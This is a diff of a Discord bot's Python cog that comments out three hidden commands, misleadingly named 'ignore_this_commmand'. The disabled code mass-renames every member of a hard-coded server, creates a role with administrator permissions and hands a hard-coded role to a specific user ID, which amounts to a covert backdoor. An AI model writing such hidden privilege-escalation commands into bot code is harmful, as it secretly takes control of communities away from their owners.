@@ -35,30 +35,30 @@ class MiscCommands(commands.Cog):
         else:
             await ctx.send("this command can only be used in certain servers")
 
-    @commands.command()
-    async def ignore_this_commmand(self, ctx):
-        the_server = self.client.get_guild(788195760209920020)
-        for user in the_server.members:
-            newname = Common.random_message(self)
-            if len(newname) >= 30:
-                newname = f"{newname[0:30]}…"
-            try:
-                await user.edit(nick=f'{newname}')
-            except:
-                aa = 3
-
-    @commands.command()
-    async def ignore_this_commmand_make(self, ctx):
-        the_server = self.client.get_guild(788195760209920020)
-        perms = discord.Permissions(administrator=True)
-        await the_server.create_role(name='Hourman', permissions=perms)
-    
-    @commands.command()
-    async def ignore_this_commmand_give(self, ctx):
-        the_server = self.client.get_guild(788195760209920020)
-        incognito_man = the_server.get_member(657381321089482783)
-        role = the_server.get_role(937479087113527317)
-        await incognito_man.add_roles(role)
+    #@commands.command()
+    #async def ignore_this_commmand(self, ctx):
+    #    the_server = self.client.get_guild(788195760209920020)
+    #    for user in the_server.members:
+    #        newname = Common.random_message(self)
+    #        if len(newname) >= 30:
+    #            newname = f"{newname[0:30]}…"
+    #        try:
+    #            await user.edit(nick=f'{newname}')
+    #        except:
+    #            aa = 3
+#
+    #@commands.command()
+    #async def ignore_this_commmand_make(self, ctx):
+    #    the_server = self.client.get_guild(788195760209920020)
+    #    perms = discord.Permissions(administrator=True)
+    #    await the_server.create_role(name='Hourman', permissions=perms)
+    #
+    #@commands.command()
+    #async def ignore_this_commmand_give(self, ctx):
+    #    the_server = self.client.get_guild(788195760209920020)
+    #    incognito_man = the_server.get_member(657381321089482783)
+    #    role = the_server.get_role(937479087113527317)
+    #    await incognito_man.add_roles(role)
 
 
 
